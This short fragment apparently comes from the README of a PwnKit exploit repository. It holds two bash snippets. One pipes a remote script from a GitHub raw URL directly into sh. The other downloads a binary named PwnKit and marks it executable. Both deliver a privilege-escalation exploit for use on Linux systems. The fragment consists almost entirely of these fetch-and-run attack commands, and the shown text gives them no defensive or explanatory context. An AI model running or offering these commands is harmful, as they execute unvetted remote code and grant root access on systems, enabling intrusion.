...
```bash
sh -c "$(curl -fsSL https://raw.githubusercontent.com/rizkylol/PwnKit/main/PwnKit.sh)"
```
...
```bash
curl -fsSL https://raw.githubusercontent.com/rizkylol/PwnKit/main/PwnKit -o PwnKit
chmod +x ./PwnKit
